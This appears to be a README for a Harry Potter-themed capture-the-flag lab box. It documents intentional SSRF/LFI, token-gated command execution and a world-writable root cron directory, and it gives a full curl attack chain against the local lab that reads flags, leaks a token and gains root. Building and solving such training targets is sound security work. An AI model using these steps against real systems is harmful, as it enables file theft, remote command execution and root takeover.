# Hill 19 - Ministry of Magic (Harry Potter) (SSRF + LFI -> RCE -> root cron)

*Theme: Harry Potter.* The Owl Post relay fetches any URL you give it (**SSRF**) and also
honours `file://` (**LFI**). Read the user flag and leak the internal dispatch token, then
drive the token-gated command dispatch.

- **Entry:** `GET /fetch?url=file:///home/owl/user.txt` reads files (LFI); the same relay
  reaches internal URLs (SSRF). Leak `file:///opt/app/owl.token`, then
  `GET /dispatch?token=<token>&cmd=...` runs commands. Foothold: `owl`. Port 80 (8099 locally).
- **Privesc:** a root "cron" loop runs `/opt/jobs/dispatch.sh` every few seconds, and
  `/opt/jobs` is world-writable. Drop your own script there; it runs as root. Restored on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Attack chain

    # 1. LFI: read the user flag
    curl -s -G http://127.0.0.1:8099/fetch --data-urlencode 'url=file:///home/owl/user.txt'

    # 2. LFI: leak the internal dispatch token
    T=$(curl -s -G http://127.0.0.1:8099/fetch --data-urlencode 'url=file:///opt/app/owl.token' | tr -d '\r\n ')

    # 3. token-gated RCE -> drop a root-run job that reads root.txt
    curl -s -G http://127.0.0.1:8099/dispatch --data-urlencode "token=$T" --data-urlencode \
      'cmd=printf "#!/bin/sh\ncat /root/root.txt > /tmp/r; chmod 666 /tmp/r\n" > /opt/jobs/dispatch.sh; chmod 755 /opt/jobs/dispatch.sh'
    sleep 4
    curl -s -G http://127.0.0.1:8099/dispatch --data-urlencode "token=$T" --data-urlencode 'cmd=cat /tmp/r'

    # 4. take the hill: same primitive, write your token to /root/king.txt
    curl -s -G http://127.0.0.1:8099/dispatch --data-urlencode "token=$T" --data-urlencode \
      'cmd=printf "#!/bin/sh\necho TOK-YOUR-TEAM > /root/king.txt\n" > /opt/jobs/dispatch.sh; chmod 755 /opt/jobs/dispatch.sh'

## Run locally

    docker compose up -d --build   # app: http://localhost:8099/

## Reset behaviour

`reset.sh` clears any dropped job, re-arms the world-writable `/opt/jobs` and the root cron
loop, and keeps the server alive. It does **not** touch `king.txt`.
